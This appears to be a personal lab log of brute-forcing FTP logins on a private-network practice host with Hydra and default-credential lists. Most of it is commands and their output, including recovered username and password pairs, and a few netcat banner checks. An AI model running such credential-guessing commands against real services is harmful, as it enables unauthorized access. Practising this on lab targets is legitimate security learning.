`dpl4hydra unix` -> create `~/.dpl4hydra/dpl4hydra_unix.lst`

`sudo hydra -C .dpl4hydra/dpl4hydra_unix.lst -e rn -o output_hydra1 ftp://10.0.2.5 -v`
`n` null passwd
`r` reverse login as passwd
```
[DATA] max 16 tasks per 1 server, overall 16 tasks, 315 login tries, ~20 tries per task
[DATA] attacking ftp://10.0.2.5:21/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[21][ftp] host: 10.0.2.5   login: ftp
[21][ftp] host: 10.0.2.5   login: ftp   password: ptf
[21][ftp] host: 10.0.2.5   login: ftp   password: ftp
[21][ftp] host: 10.0.2.5   login: user   password: user
Process 9881: Can not connect [unreachable], retrying (1 of 1 retries)
Process 10540: Can not connect [unreachable], retrying (1 of 1 retries)
Process 11090: Can not connect [unreachable], retrying (1 of 1 retries)
```
probably DoS'ed ftp -> `ctrl-c`

`ping 10.0.2.5`
```
PING 10.0.2.5 (10.0.2.5) 56(84) bytes of data.
64 bytes from 10.0.2.5: icmp_seq=1 ttl=64 time=0.329 ms
64 bytes from 10.0.2.5: icmp_seq=2 ttl=64 time=0.540 ms
^C
```
host seems up

`nc -vn 10.0.2.5 21`
```
(UNKNOWN) [10.0.2.5] 21 (ftp) open
220 (vsFTPd 2.3.4)
USER anonymous
331 Please specify the password.
```
ftp is up

`sudo hydra -R -t 5`
`-t 5` tasks (parallel conn.). Maybe ftp will survive this time
```
[INFORMATION] reading restore file ./hydra.restore
[WARNING] options after -R are now honored (since v8.6)
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-13 17:15:13
[DATA] max 5 tasks per 1 server, overall 5 tasks, 315 login tries, ~63 tries per task
[DATA] attacking ftp://10.0.2.5:21/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[STATUS] 237.00 tries/min, 237 tries in 00:01h, 78 to do in 00:01h, 5 active
[STATUS] 118.50 tries/min, 237 tries in 00:02h, 78 to do in 00:01h, 5 active
[STATUS] 79.00 tries/min, 237 tries in 00:03h, 78 to do in 00:01h, 5 active
[STATUS] 59.25 tries/min, 237 tries in 00:04h, 78 to do in 00:02h, 5 active
Process 133069: Can not connect [unreachable], retrying (1 of 1 retries)
```
Are you for real? No progress at all, still 78 to do.
Maybe it's bcos of null ass passwd?

`less output_hydra1` - to save current progress
```
# Hydra v9.1 run at 2022-07-13 17:10:19 on 10.0.2.5 ftp (hydra -C .dpl4hydra/dpl4hydra_unix.lst -e rn -o output_hydra1 -v ftp://10.0.2.5)
[21][ftp] host: 10.0.2.5   login: ftp
[21][ftp] host: 10.0.2.5   login: ftp   password: ptf
[21][ftp] host: 10.0.2.5   login: ftp   password: ftp
[21][ftp] host: 10.0.2.5   login: user   password: user
# Hydra v9.1 run at 2022-07-13 17:15:13 on 10.0.2.5 ftp (hydra -R -t 5)
```
ftp seems like is reacting to any passwd

next try:
`sudo hydra -C .dpl4hydra/dpl4hydra_unix.lst -e r -o output_hydra1 -t 10 ftp://10.0.2.5 -v`
```
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 10 tasks per 1 server, overall 10 tasks, 210 login tries, ~21 tries per task
[DATA] attacking ftp://10.0.2.5:21/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[21][ftp] host: 10.0.2.5   login: ftp   password: ptf
[21][ftp] host: 10.0.2.5   login: user   password: user
[STATUS] 171.00 tries/min, 171 tries in 00:01h, 39 to do in 00:01h, 10 active
[STATUS] 85.50 tries/min, 171 tries in 00:02h, 39 to do in 00:01h, 10 active
Process 205230: Can not connect [unreachable], retrying (1 of 1 retries)
Process 208328: Can not connect [unreachable], retrying (1 of 1 retries)
Process 208330: Can not connect [unreachable], retrying (1 of 1 retries)
^C[ERROR] Received signal 2, going down ...
The session file ./hydra.restore was written. Type "hydra -R" to resume session.
[ERROR] Received signal 2, going down ...
```
 parallelly:
 `nc -vn 10.0.2.5 21`
```
 (UNKNOWN) [10.0.2.5] 21 (ftp) : Connection refused
```
so "Dos" again. I'm begginig to think that ftp block incoming connections after several unsuccessfull attempts for a little time.

`netcat` claim that FTP is up again

`sudo hydra -R -t 5`
```
[INFORMATION] reading restore file ./hydra.restore
[WARNING] options after -R are now honored (since v8.6)
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-13 17:38:56
[DATA] max 5 tasks per 1 server, overall 5 tasks, 210 login tries, ~42 tries per task
[DATA] attacking ftp://10.0.2.5:21/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[STATUS] attack finished for 10.0.2.5 (waiting for children to complete tests)
1 of 1 target successfully completed, 2 valid passwords found
```
